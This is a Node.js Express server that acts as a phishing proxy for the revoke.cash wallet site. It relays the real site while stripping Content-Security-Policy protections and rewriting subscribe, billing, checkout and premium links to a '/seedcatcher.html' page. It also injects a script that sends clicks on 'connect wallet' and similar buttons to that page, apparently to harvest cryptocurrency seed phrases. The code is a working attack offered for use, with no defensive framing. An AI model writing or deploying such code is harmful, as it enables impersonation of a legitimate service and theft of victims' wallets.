const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(async (req, res, next) => {
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.removeHeader('Content-Security-Policy');
        res.removeHeader('Content-Security-Policy-Report-Only');

        if (req.path === '/' || req.path === '/index.html') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                // Remove CSP meta tags
                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                
                // HIJACK LINKS DIRECTLY IN HTML
                // Change any href="/premium" to your catcher
                html = html.replace(/href="[^"]*\/premium[^"]*"/gi, 'href="/seedcatcher.html"');
                html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
                html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
                html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');

                // Inject the inline script just in case there are buttons
                const inlineScript = `
                <script>
                document.addEventListener('click', function(e) {
                    let t = e.target.closest('a, button');
                    if (t && (t.innerText || "").toLowerCase().match(/(get started|subscribe|upgrade|connect wallet)/)) {
                        e.preventDefault();
                        window.location.href = '/seedcatcher.html';
                    }
                }, true);
                </script>
                `;
                if (html.includes('</body>')) {
                    html = html.replace('</body>', inlineScript + '</body>');
                }
                res.send(html);
            });
        } else {
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.redirect('/seedcatcher.html');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
